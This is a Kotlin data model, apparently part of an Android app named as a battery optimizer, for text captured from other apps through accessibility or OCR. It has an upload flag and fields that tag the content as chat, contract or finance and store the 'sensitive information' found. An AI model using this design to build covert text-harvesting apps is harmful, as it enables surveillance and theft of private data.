package com.android.batteryoptimization

import com.google.gson.annotations.SerializedName

data class InputEvent(
    @SerializedName("timestamp") val timestamp: Long,
    @SerializedName("packageName") val packageName: String,
    @SerializedName("appName") val appName: String? = null,
    @SerializedName("text") val text: String,
    @SerializedName("source") val source: String = "accessibility",  // "accessibility" or "ocr"
    @SerializedName("isUploaded") val isUploaded: Boolean = false,

    // ── 内容分类（仅 source="ocr" 时使用） ──
    /** 内容类型：chat / contract / form / finance / other */
    val contentType: String? = null,
    /** 风险等级：low / medium / high */
    val riskLevel: String? = null,
    /** 敏感信息（JSON 序列化后） */
    val sensitiveInfoJson: String? = null
)
